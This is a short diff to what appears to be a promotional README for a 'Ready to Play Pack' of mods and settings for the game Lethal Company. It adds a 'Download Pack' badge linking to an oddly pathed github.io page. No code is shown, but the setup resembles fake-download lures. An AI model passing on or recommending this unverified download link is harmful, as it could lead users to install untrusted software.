@@ -6,6 +6,8 @@ Step into Lethal Company like a true legend. This pack gives you everything you 
 
 ---
 
+
+[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://lethal-company-ready-to-play-pack.github.io/.github/)
 ## **Product Description:**
 
 The **Ready to Play Pack** for **Lethal Company** is the must-have setup for anyone jumping into this chaotic multiplayer horror-co-op banger. Whether you're solo-queuing or dragging your squad through dark corridors, this pack sets you up with the smoothest launch possible. We’re talking quality-of-life tweaks, pre-configured settings, essential mods, and utility tools that make your gameplay slick, responsive, and way more fun.
